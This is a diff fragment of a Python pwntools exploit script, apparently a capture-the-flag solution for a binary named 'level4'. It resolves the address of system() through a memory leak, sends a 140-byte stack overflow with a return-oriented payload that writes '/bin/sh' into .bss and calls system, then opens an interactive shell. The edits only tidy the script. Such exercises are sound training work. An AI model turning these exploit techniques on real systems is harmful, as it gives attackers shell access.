@@ -21,19 +21,15 @@ d = DynELF(leak, elf=ELF('./level4'))
 system_addr = d.lookup('system', 'libc')
 print "system_addr=" + hex(system_addr)
 
-bss_addr = 0X0804c020
-pppr = 0x08049241#0x08049241
+bss_addr = 0x0804c020
+pppr = 0x08049241
 
-payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
-print payload2
+payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
 payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-
 #ss = raw_input()
 
-#aqui ya no entra desde arriba
 print "\n###sending payload2 ...###"
 p.send(payload2)
 p.send("/bin/sh\0")
-#p.recv()
-p.interactive()
 
+p.interactive()
